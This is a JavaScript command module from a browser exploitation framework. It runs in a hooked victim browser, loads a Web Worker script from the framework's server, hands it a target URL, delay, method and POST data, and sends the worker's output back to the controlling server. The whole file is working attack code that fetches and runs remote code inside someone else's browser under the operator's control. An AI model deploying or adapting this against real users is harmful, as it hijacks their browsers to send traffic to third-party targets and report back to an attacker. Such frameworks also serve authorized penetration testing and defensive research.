//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

    var url = '<%= @url %>';
    var delay = '<%= @delay %>';
    var method = '<%= @method %>';
    var post_data = '<%= @post_data %>';

    if(!!window.Worker){
      var myWorker = new Worker(server.net.httpproto + '://' + server.net.host + ':' + server.net.port + '/worker.js');

      myWorker.onmessage = function (oEvent) {
        server.net.send('<%= @command_url %>', <%= @command_id %>, oEvent.data);
      };

      var data = {};
      data['url'] = url;
      data['delay'] = delay;
      data['method'] = method;
      data['post_data'] = post_data;

      myWorker.postMessage(data);
    }else{
       server.net.send('<%= @command_url %>', <%= @command_id %>, 'Error: WebWorkers are not supported on this browser.');
    }


});
